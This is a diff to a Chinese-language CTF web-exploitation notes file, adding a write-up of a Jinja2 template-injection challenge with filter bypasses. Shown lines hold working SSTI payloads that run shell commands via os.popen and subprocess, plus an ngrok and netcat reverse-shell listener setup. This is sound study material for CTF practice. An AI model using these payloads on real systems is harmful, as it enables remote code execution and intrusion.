@@ -118,6 +118,9 @@ for i in range(300,1000):
 - [PickYourStarter](https://github.com/MasonCompetitiveCyber/PatriotCTF2023/tree/main/Web/pickyourstarter)
     - 可以用自定义header传命令：`{{joiner.__init__.__globals__.os.popen(request.headers.cmd).read()}}`,然后header里添加`cmd: cat flag.txt`
 `{{().__class__.__base__.__subclasses__().__getitem__(455)(request.args.shell,shell=True,stdout=(1).__neg__()).communicate()}}`:用getitem绕`[]`过滤，`(1).__neg__()`绕负号过滤
+- [My First App](https://ireland.re/posts/UofTCTF_2024/#webmy-first-app)
+    - 过滤方括号、下划线及引号。利用lipsum逃逸，`|attr()`代替方括号，并将带有下划线的项放在请求头，用`request.pragma.0`访问（有些header里面没法放下划线，Pragma可以，所以用多个Pragma传递带有下划线的项，数字表示第i个Pragma里的内容）
+    - https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#my-first-app
 - [Frog-WAF](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/)
     - java ssti模板注入（[EL - Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)）。此题的难点在于waf，限制了所有数字和一些特殊符号与java的类名
     - 其他payload：
@@ -1227,13 +1230,11 @@ position: absolute;
 `!important`的优先级比`display: none;`高，高亮标签内的内容。
 
 171. 使用ngrok转发tcp端口,实现反弹远程shell。[How to catch a Reverse shell over the Internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)。
-
 ```
 ngrok tcp 7777
 //另一个终端窗口监听指定tcp端口
 nc -lv 7777
 ```
-
 172. [[网鼎杯 2020 青龙组]filejava](http://www.xianxianlabs.com/blog/2020/06/02/377.html)
 - 路径穿越导致任意文件下载漏洞。因为是java题，所以根据[Java web应用目录结构](https://www.qikegu.com/docs/1424)，下载WEB-INF里面的web.xml，获取所有的类源码文件。
 - poi-ooxml-3.10（一个处理word文档，excel文件的组件）的excel-xxe漏洞：[CVE-2014-3529](https://xz.aliyun.com/t/6996)利用。
